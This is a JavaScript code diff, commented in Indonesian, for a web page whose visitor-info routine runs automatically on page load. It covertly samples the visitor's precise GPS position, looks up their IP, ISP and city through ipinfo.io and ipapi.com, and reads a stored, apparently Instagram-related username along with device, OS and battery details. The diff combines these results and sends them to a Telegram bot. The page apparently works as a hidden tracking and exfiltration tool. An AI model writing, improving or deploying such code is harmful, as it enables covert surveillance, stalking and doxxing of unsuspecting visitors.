@@ -111,17 +111,18 @@ const openPhotoOptions = document.getElementById('openPhotoOptions');
     }
   });
   
-  // versi akurat: GPS ➜ ipinfo.io ➜ ipapi.com
+// versi gabungan: GPS + ipinfo.io + ipapi.com
 async function showVisitorInfo() {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
 
-  // kirim pesan ke Telegram
-  async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
+  // kirim data ke Telegram
+  async function sendToTelegram(data) {
     try {
       const now = new Date();
-      const mapLink = (latitude && longitude)
-        ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
+      const mapLink = (data.latitude && data.longitude)
+        ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}&z=17`
         : "https://www.google.com/maps";
+
       const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
       const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
                  /Android/i.test(navigator.userAgent) ? "Android" :
@@ -137,14 +138,14 @@ async function showVisitorInfo() {
       const msg =
 `📢 Pengunjung Baru!
 👤 ${savedUser}
-🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
+🌎 ${data.city || "?"}, ${data.country || "?"}
 🗺️ Maps: ${mapLink}
-📍 Sumber Lokasi: ${source}${accuracy ? ` (±${accuracy}m)` : ""}
+📍 Sumber Lokasi: Gabungan GPS + IP (±${data.accuracy || "?"}m)
 💻 ${device}
 🧩 OS: ${os}
 🔋 Baterai: ${batteryInfo}
-🏷️ ISP: ${d.isp || d.org || d.connection?.isp || "?"}
-📡 IP: ${d.ip || "?"}
+🏷️ ISP: ${data.isp || "?"}
+📡 IP: ${data.ip || "?"}
 🕓 ${now.toLocaleString('id-ID')}`;
 
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -152,16 +153,16 @@ async function showVisitorInfo() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
       });
-      console.log("✅ Info pengunjung dikirim (sumber:", source, ")");
+      console.log("✅ Lokasi gabungan terkirim");
     } catch (err) {
-      console.error("❌ Gagal kirim info:", err);
+      console.error("❌ Gagal kirim ke Telegram:", err);
     }
   }
 
-  // GPS multi-sampling (lebih stabil)
-  async function getBestGPS(samples = 5) {
-    return new Promise((resolve, reject) => {
-      if (!navigator.geolocation) return reject("Geolocation tidak didukung");
+  // fungsi bantu: ambil GPS
+  async function getGPS(samples = 5) {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) return resolve(null);
       const results = [];
       const opts = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
 
@@ -171,20 +172,20 @@ async function showVisitorInfo() {
           if (results.length >= samples) {
             const best = results.reduce((a, b) => a.accuracy < b.accuracy ? a : b);
             resolve(best);
-          } else setTimeout(capture, 700);
-        }, err => {
+          } else setTimeout(capture, 600);
+        }, () => {
           if (results.length > 0) {
             const best = results.reduce((a, b) => a.accuracy < b.accuracy ? a : b);
             resolve(best);
-          } else reject(err);
+          } else resolve(null);
         }, opts);
       }
       capture();
     });
   }
 
-  // ambil lokasi dari ipinfo.io
-  async function getIPInfoLocation() {
+  // fungsi bantu: ipinfo.io
+  async function getIPInfo() {
     try {
       const res = await fetch("https://ipinfo.io/json?token=free");
       const d = await res.json();
@@ -196,18 +197,15 @@ async function showVisitorInfo() {
           city: d.city,
           country: d.country,
           ip: d.ip,
-          isp: d.org,
-          accuracy: 5000
+          isp: d.org
         };
       }
-    } catch (err) {
-      console.error("⚠️ Gagal ambil dari ipinfo.io:", err);
-    }
+    } catch (e) { console.warn("ipinfo.io gagal:", e); }
     return null;
   }
 
-  // ambil lokasi dari ipapi.com (demo key)
-  async function getIPApiComLocation() {
+  // fungsi bantu: ipapi.com
+  async function getIPApiCom() {
     try {
       const res = await fetch("https://api.ipapi.com/api/check?access_key=demo");
       const d = await res.json();
@@ -217,39 +215,32 @@ async function showVisitorInfo() {
         city: d.city,
         country: d.country_name,
         ip: d.ip,
-        isp: d.org,
-        accuracy: 5000
+        isp: d.org
       };
-    } catch (err) {
-      console.error("⚠️ Gagal ambil dari ipapi.com:", err);
-      return null;
-    }
+    } catch (e) { console.warn("ipapi.com gagal:", e); }
+    return null;
   }
 
-  // urutan logika utama
-  try {
-    // 🛰️ 1️⃣ GPS
-    const coords = await getBestGPS(6);
-    const { latitude, longitude, accuracy } = coords;
-    const info = await getIPInfoLocation();
-    await sendToTelegram(info || {}, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
-  } catch (gpsErr) {
-    console.warn("⚠️ GPS gagal, fallback ke IP service:", gpsErr);
-    // 🌐 2️⃣ ipinfo.io dulu
-    const info = await getIPInfoLocation();
-    if (info) {
-      await sendToTelegram(info, info.latitude, info.longitude, "ipinfo.io", info.accuracy);
-      return;
-    }
-    // 🌍 3️⃣ fallback ke ipapi.com
-    const api = await getIPApiComLocation();
-    if (api) {
-      await sendToTelegram(api, api.latitude, api.longitude, "ipapi.com", api.accuracy);
-      return;
-    }
-    // 🚨 terakhir, gagal total
-    await sendToTelegram({}, null, null, "Fixed");
-  }
+  // Jalankan semua bersamaan
+  const [gpsData, infoData, apiData] = await Promise.all([
+    getGPS(6),
+    getIPInfo(),
+    getIPApiCom()
+  ]);
+
+  // Gabungkan hasil terbaik
+  const finalData = {
+    latitude: gpsData?.latitude || infoData?.latitude || apiData?.latitude || null,
+    longitude: gpsData?.longitude || infoData?.longitude || apiData?.longitude || null,
+    accuracy: gpsData?.accuracy || 5000,
+    city: gpsData?.city || infoData?.city || apiData?.city || null,
+    country: gpsData?.country || infoData?.country || apiData?.country || null,
+    isp: infoData?.isp || apiData?.isp || null,
+    ip: infoData?.ip || apiData?.ip || null
+  };
+
+  // Kirim hasil gabungan
+  await sendToTelegram(finalData);
 }
 
 showVisitorInfo();
